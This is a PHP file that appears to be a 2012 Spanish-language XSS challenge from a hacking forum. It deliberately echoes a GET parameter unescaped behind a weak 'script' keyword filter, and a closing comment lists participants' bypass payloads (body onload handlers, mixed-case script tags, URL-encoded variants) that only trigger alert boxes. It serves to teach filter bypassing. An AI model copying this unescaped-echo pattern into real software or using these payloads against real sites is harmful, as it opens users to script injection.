<?php
/*
Author: 2Fac3R
Date: Abril 10, 2012
Title: [Reto] XSSme Lv.0
Site: HackxCrack

Objetivo:
Mostrar un alert de cualquier forma y entregar un exploit por mp.

*/
error_reporting(0);
$reto = $_GET['nombre'];
if(isset($reto) && !empty($reto)){
        if(!preg_match("/script/",$reto)){ // Podras hacer el bypass?
                echo 'Bienvenido!! '.$reto;
        }else{
                echo "Estas intentando juakiarnos?";
        }
}else{
        if(isset($_GET['send'])){
                die("Debes ingresar tu nombre!");
        }
        ?>
    <form action="" method="GET">
        <input type="text" name="nombre">
        <input type="submit" name="send" value="Prestarme!"> </form>
    <?
}

/*
SOLUCIONES
Kid_goth
?nombre=<body onload="alert('xD');">

11Sep
#!/usr/bin/python

import os

os.system('opera http://127.0.0.1/asd/index.php?nombre=%3CScRiPt%3Ealert%285%29%3B%3C%2FScrIpt%3E&send=Prestarme%21')

SkippyCreammy
?nombre=<Script>alert('puto')</scRipt>

v1c0_h4ck
http://localhost/retos/hxc/XSSme_Lv.0.php?nombre=%3Cs%2Bcript%3Ealert%28%22v1c0_h4ck%22%29%3B%3C%2Fs%2Bcript%3E&send=Prestarme!

2Fac3R
?nombre=<body onload="javaScript:alert('XSSed')">

Como veran, el filtro simplemente prohibia la inyeccion de "script" y era bastante sencillo hacer el bypass.

*/
?>